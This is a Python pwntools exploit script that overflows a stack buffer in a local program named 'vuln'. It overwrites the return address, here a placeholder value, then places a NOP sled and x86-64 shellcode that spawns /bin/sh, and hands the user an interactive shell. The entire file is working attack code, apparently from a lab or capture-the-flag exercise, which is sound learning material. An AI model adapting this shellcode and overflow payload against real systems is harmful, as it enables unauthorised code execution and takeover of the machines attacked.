#!/usr/bin/python
from pwn import *
import os

path = os.getcwd()              # Get the current directory
prog = 'vuln'                   # Filename of vulnerable program
full_path = path + '/' + prog   # Full path to vulnerable program

# Shellcode that executes a /bin/sh shell
shellcode = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x0f\xaf\xc2\x04\x3b\x0f\x05"

junk = 'A' * 128                # Random A's to fill up buffer
rbp = 'B' * 8                   # This is used as a marker before ovewriting return address
nop_sled = '\x90' * 32          # Tells cpu to do nothing until shellcode is reached
ret_addr = p64(0xdeadbeefcafebabe)  # To overwrite return address with our custom values

bo = junk + rbp + ret_addr + nop_sled + shellcode # Full payload to be send into the vulnerable program

p = process(full_path)                            # Executes the vulnerable program

raw_input(str(p.proc.pid))                        # For GDB use
p.sendline(bo)                                    # Sends the payload to the vulnerable program

p.interactive()                                   # Passes control back to user
